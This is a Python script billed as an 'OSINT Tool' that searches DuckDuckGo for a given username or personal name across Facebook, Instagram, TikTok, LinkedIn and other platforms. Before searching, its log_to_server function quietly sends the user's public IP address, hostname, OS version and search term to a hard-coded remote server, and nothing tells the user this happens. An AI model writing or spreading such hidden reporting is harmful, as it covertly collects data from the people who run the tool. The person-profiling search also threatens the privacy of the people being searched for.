import requests
from bs4 import BeautifulSoup
import urllib.parse
import re
import time
import platform
import json

# ===== سيرفر Railway endpoint =====
SERVER_URL = "https://osint-tool-production.up.railway.app/log_search"  # ضع الرابط الصحيح

# ===== المنصات =====
PLATFORMS = {
    "Facebook": "facebook.com",
    "Instagram": "instagram.com",
    "Youtube": "youtube.com",
    "TikTok": "tiktok.com",
    "Snapchat": "snapchat.com",
    "Reddit": "reddit.com",
    "Twitter": "twitter.com",
    "Pinterest": "pinterest.com",
    "LinkedIn": "linkedin.com",
}

REQUEST_DELAY = 1.0  # تأخير بين كل منصة

session = requests.Session()
HEADERS = {
    "User-Agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 (KHTML, like Gecko) "
        "Chrome/120.0.0.0 Safari/537.36"
    )
}
session.headers.update(HEADERS)


def duckduckgo_search_links(query, site=None, num_results=10):
    search_query = f"{query} site:{site}" if site else query
    url = "https://html.duckduckgo.com/html/"
    params = {"q": search_query}
    links = []

    try:
        resp = session.get(url, params=params, timeout=15)
        if resp.status_code != 200:
            print(f"⚠️ DuckDuckGo status {resp.status_code} for {site}")
            return links

        soup = BeautifulSoup(resp.text, "html.parser")
        anchors = soup.select("a.result__a")
        for a in anchors:
            href = a.get("href")
            link = None
            if href:
                if "uddg=" in href:
                    m = re.search(r"uddg=([^&]+)", href)
                    if m:
                        link = urllib.parse.unquote(m.group(1))
                else:
                    link = href
            if link and link.startswith("http") and link not in links:
                links.append(link)
            if len(links) >= num_results:
                break
    except Exception as e:
        print("⚠️ Error searching DuckDuckGo:", e)
    return links


def log_to_server(search_input):
    try:
        ip = requests.get("https://api64.ipify.org?format=json", timeout=10).json().get("ip", "0.0.0.0")
    except:
        ip = "0.0.0.0"

    data = {
        "username": platform.node(),
        "os": platform.system() + " " + platform.release(),
        "ip": ip,
        "search": search_input
    }

    try:
        requests.post(SERVER_URL, json=data, timeout=10)
    except Exception as e:
        print("⚠️ Failed to log search to server:", e)


def main():
    print("=== OSINT Tool - DuckDuckGo Search ===\n")
    search_input = input("Enter username or first/last name: ").strip()
    if not search_input:
        print("No input provided")
        return

    # سجل فقط البيانات
    log_to_server(search_input)

    for platform_name, domain in PLATFORMS.items():
        print(f"\n🔍 Searching {platform_name}...")
        links = duckduckgo_search_links(search_input, domain, num_results=10)
        if links:
            print(f"✅ {len(links)}/10 results:")
            for link in links:
                print("  ", link)
        else:
            print("❌ No results found.")
        time.sleep(REQUEST_DELAY)


if __name__ == "__main__":
    main()
